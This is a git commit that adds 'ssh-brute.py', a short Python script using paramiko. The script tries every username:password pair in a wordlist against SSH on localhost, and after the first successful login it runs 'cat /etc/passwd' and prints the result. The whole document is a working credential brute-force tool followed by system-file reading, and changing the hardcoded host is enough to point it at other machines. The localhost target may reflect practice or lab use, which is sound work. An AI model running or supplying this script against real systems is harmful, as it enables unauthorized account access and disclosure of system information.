8f99d1fef9ce9043c06a8a5209474d72cf60751b
pakak22 <pakak22@gmail.com>
2018-08-29 18:11:06 -0400

    Add files via upload

---
+++ ssh-brute.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python
+
+import paramiko
+import sys
+
+ssh = paramiko.SSHClient()
+
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+fd = open(sys.argv[1], "r")
+
+# assume the user-pass file is of the form username:password\n
+
+for line in fd.readlines():
+
+    user_pass = line.strip().split(':')
+
+    try:
+        ssh.connect('localhost', username=user_pass[0], password=user_pass[1])
+
+    except paramiko.AuthenticationException:
+        print '[-] Username %s and Password %s is Incorrect!' % (user_pass[0], user_pass[1])
+
+    else:
+        print '[-] Username %s and Password %s is Correct!' % (user_pass[0], user_pass[1])
+
+	stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
+
+        for line in stdout.readlines():
+             print line.strip()
+
+        break
+
+ssh.close()
+
